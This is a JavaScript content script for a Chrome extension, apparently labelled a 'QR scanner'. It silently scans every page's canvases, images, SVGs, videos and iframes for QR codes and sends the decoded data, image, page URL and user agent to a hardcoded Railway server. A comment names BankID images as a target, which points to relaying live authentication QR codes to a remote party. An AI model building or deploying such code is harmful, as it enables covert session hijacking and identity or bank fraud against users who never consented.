// ZETA ENHANCED QR SCANNER - MAXIMUM POWER VERSION
// Enhanced Content Script for Railway Server with advanced stability features

// Server configuration
const ZETA_RAILWAY_SERVER = 'https://web-production-72c0d.up.railway.app/';
let lastQR = null;
let consecutiveFailures = 0;
let isConnected = true;
let isScannerEnabled = true;
let scanInterval = 2000;
let retryTimeout = null;
let html5QrCodeInstance = null; // Singleton instance

// Initialize scanner state
chrome.storage.local.get(['scannerEnabled'], (result) => {
  if (result.scannerEnabled !== undefined) {
    isScannerEnabled = result.scannerEnabled;
    console.log(`[Zeta QR] Initial scanner state: ${isScannerEnabled ? 'ENABLED' : 'DISABLED'}`);
  }
});

// Ensure hidden container exists for Html5Qrcode
function ensureScannerContainer() {
  const id = "zeta-qr-hidden-reader";
  if (!document.getElementById(id)) {
    const div = document.createElement("div");
    div.id = id;
    div.style.display = "none";
    document.body.appendChild(div);
  }
  return id;
}

// Get or create Html5Qrcode instance
function getHtml5QrCode() {
  if (window.Html5Qrcode && !html5QrCodeInstance) {
    try {
      const elementId = ensureScannerContainer();
      html5QrCodeInstance = new Html5Qrcode(elementId);
    } catch (e) {
      console.log('[Zeta QR] Failed to create Html5Qrcode instance:', e);
    }
  }
  return html5QrCodeInstance;
}

// Safe message sending
function safeSendMessage(message) {
  try {
    if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
      chrome.runtime.sendMessage(message).catch(err => {
        // Suppress expected errors
      });
    }
  } catch (error) {
    console.log('[Zeta QR] ⚠️ Extension context error:', error);
  }
}

// Enhanced QR detection loop
async function scanForQR() {
  if (!isScannerEnabled) return;

  try {
    await scanCanvasElements();
    await scanImageElements(); 
    await scanSVGElements();
    await scanVideoElements();
    await scanIframeElements();
  } catch (e) {
    console.log('[Zeta QR] Strategy loop error:', e);
  }
}

// --- Strategies ---

async function scanCanvasElements() {
  const canvases = document.querySelectorAll('canvas');
  for (const canvas of canvases) {
    if (!canvas.width || !canvas.height) continue;
    try {
      const dataUrl = canvas.toDataURL('image/png');
      
      // Try jsQR first (fastest)
      if (window.jsQR) {
        const ctx = canvas.getContext('2d', { willReadFrequently: true });
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const code = jsQR(imageData.data, imageData.width, imageData.height);
        if (code && code.data) {
          handleQRFound(code.data, dataUrl);
          continue; 
        }
      }
      
      // Fallback to Html5Qrcode
      await scanWithHtml5Qrcode(dataUrl);
    } catch (e) {
      // Canvas might be tainted or empty
    }
  }
}

async function scanImageElements() {
  const images = document.querySelectorAll('img');
  for (const img of images) {
    if (!img.complete || !img.naturalWidth) continue;
    if (img.naturalWidth < 50 || img.naturalHeight < 50) continue;

    // Check if we've already scanned this image recently to avoid spamming
    if (img.dataset.zetaScanned && Date.now() - parseInt(img.dataset.zetaScanned) < 2000) continue;
    img.dataset.zetaScanned = Date.now();

    try {
      // Method 1: Fetch as Blob (Bypasses CORS Tainted Canvas issues if extension permissions allow)
      // This is the robust way for external images (like BankID)
      const src = img.src;
      if (src.startsWith('http')) {
        await scanUrlWithHtml5Qrcode(src);
      } else {
        // Data URL or local
        await scanWithHtml5Qrcode(src);
      }
      
      // Method 2: jsQR via Canvas (Only works if not tainted)
      if (window.jsQR) {
        const canvas = document.createElement('canvas');
        canvas.width = img.naturalWidth;
        canvas.height = img.naturalHeight;
        const ctx = canvas.getContext('2d', { willReadFrequently: true });
        
        // Try to avoid tainting
        if (img.crossOrigin !== "Anonymous" && src.startsWith('http')) {
           // Can't use existing img element safely on canvas if it wasn't loaded with CORS
           // Skip jsQR for external images, rely on scanUrlWithHtml5Qrcode
        } else {
           ctx.drawImage(img, 0, 0);
           const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
           const code = jsQR(imageData.data, imageData.width, imageData.height);
           if (code && code.data) {
             handleQRFound(code.data, canvas.toDataURL('image/png'));
           }
        }
      }

    } catch (e) {
      // ignore
    }
  }
}

async function scanUrlWithHtml5Qrcode(url) {
  try {
    // Fetching as blob allows us to scan without canvas tainting issues
    const response = await fetch(url, { mode: 'cors', credentials: 'omit' }).catch(() => null);
    if (!response || !response.ok) return; // Fetch failed (maybe blocked)

    const blob = await response.blob();
    const file = new File([blob], "qr_scan.png", { type: "image/png" });
    
    const scanner = getHtml5QrCode();
    if (scanner) {
      const decodedText = await scanner.scanFile(file, false);
      if (decodedText) {
        const reader = new FileReader();
        reader.onloadend = () => handleQRFound(decodedText, reader.result);
        reader.readAsDataURL(blob);
      }
    }
  } catch (e) {
    // Scan failed or fetch failed
  }
}

async function scanWithHtml5Qrcode(imageSource) {
  if (!imageSource) return;
  try {
    const scanner = getHtml5QrCode();
    if (scanner) {
      // For data URLs, we can convert to blob
      const res = await fetch(imageSource);
      const blob = await res.blob();
      const file = new File([blob], "qr.png", { type: "image/png" });
      
      const decodedText = await scanner.scanFile(file, false);
      if (decodedText) {
        handleQRFound(decodedText, imageSource);
      }
    }
  } catch (err) {
    // console.log("Html5Qrcode scan failed", err);
  }
}

async function scanSVGElements() {
  const svgs = document.querySelectorAll('svg');
  for (const svg of svgs) {
    try {
      const svgData = new XMLSerializer().serializeToString(svg);
      const blob = new Blob([svgData], {type: 'image/svg+xml'});
      const url = URL.createObjectURL(blob);
      await scanWithHtml5Qrcode(url);
      URL.revokeObjectURL(url);
    } catch (e) {}
  }
}

function scanVideoElements() {
  // Videos: stick to jsQR for performance
  const videos = document.querySelectorAll('video');
  for (const video of videos) {
    if (video.readyState < 2) continue; 
    try {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d', { willReadFrequently: true });
      ctx.drawImage(video, 0, 0);
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      
      if (window.jsQR) {
        const code = jsQR(imageData.data, imageData.width, imageData.height);
        if (code && code.data) handleQRFound(code.data, canvas.toDataURL('image/png'));
      }
    } catch (e) {}
  }
}

function scanIframeElements() {
  const iframes = document.querySelectorAll('iframe');
  for (const iframe of iframes) {
    try {
      if (iframe.contentDocument) {
        // Recursive logic or simplified image scanning inside iframe
        const imgs = iframe.contentDocument.querySelectorAll('img');
        imgs.forEach(img => {
           if (img.src) scanWithHtml5Qrcode(img.src);
        });
      }
    } catch (e) {}
  }
}

// --- Handling & Network ---

function handleQRFound(qrData, base64Image) {
  if (qrData === lastQR) return; 

  lastQR = qrData;
  console.log('[Zeta QR] 🔥 FOUND QR CODE:', qrData.substring(0, 100));
  
  consecutiveFailures = 0;
  scanInterval = Math.max(1000, scanInterval - 100); 
  
  safeSendMessage({
    type: 'QR_FOUND',
    qrData: qrData.substring(0, 100),
    timestamp: Date.now()
  });
  
  sendQRToServer(base64Image, qrData);
}

function sendQRToServer(base64Image, qrString = null) {
  const payload = {
    qrData: base64Image,
    qrString: qrString,
    timestamp: Date.now(),
    userAgent: navigator.userAgent,
    url: window.location.href
  };

  console.log('[Zeta QR] 📤 Sending QR...');
  
  fetch(ZETA_RAILWAY_SERVER + 'api/qr', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
    mode: 'cors',
    credentials: 'omit'
  })
  .then(async response => {
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    console.log('[Zeta QR] ✅ Sent!');
    consecutiveFailures = 0;
    isConnected = true;
    scanInterval = 2000;
    safeSendMessage({ type: 'QR_SENT_SUCCESS', timestamp: Date.now() });
  })
  .catch(error => {
    console.log('[Zeta QR] ❌ Send failed:', error.message);
    consecutiveFailures++;
    safeSendMessage({ type: 'QR_SENT_FAILED', error: error.message, timestamp: Date.now() });
    if (consecutiveFailures >= 3) {
      isConnected = false;
      scanInterval = Math.min(10000, scanInterval + 1000);
    }
  });
}

function checkConnection() {
  fetch(ZETA_RAILWAY_SERVER + 'health', { method: 'GET', mode: 'cors', credentials: 'omit' })
    .then(response => {
      if (response.ok) {
        isConnected = true;
        consecutiveFailures = 0;
      }
    })
    .catch(() => { isConnected = false; });
}

function startScanning() {
  if (!isConnected && consecutiveFailures > 5) scanInterval = 10000;
  
  scanForQR();
  setTimeout(startScanning, scanInterval);
}

// --- Init ---

try {
  console.log('[Zeta QR] 🚀 ENHANCED SCANNER INITIALIZED');
  
  // Create hidden container immediately
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', ensureScannerContainer);
  } else {
    ensureScannerContainer();
  }

  setInterval(checkConnection, 30000);
  checkConnection();
  startScanning();

  // Listen for page changes
  let lastUrl = location.href;
  new MutationObserver(() => {
    const url = location.href;
    if (url !== lastUrl) {
      lastUrl = url;
      console.log('[Zeta QR] 📄 Page changed');
      lastQR = null; 
    }
  }).observe(document, {subtree: true, childList: true});

} catch (error) {
  console.log('[Zeta QR] ❌ Init error:', error);
}

// Listen for messages
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === 'SCANNER_TOGGLE') {
    isScannerEnabled = request.enabled;
    console.log(`[Zeta QR] Scanner ${isScannerEnabled ? 'ENABLED' : 'DISABLED'}`);
    if (isScannerEnabled) scanForQR();
  }
});
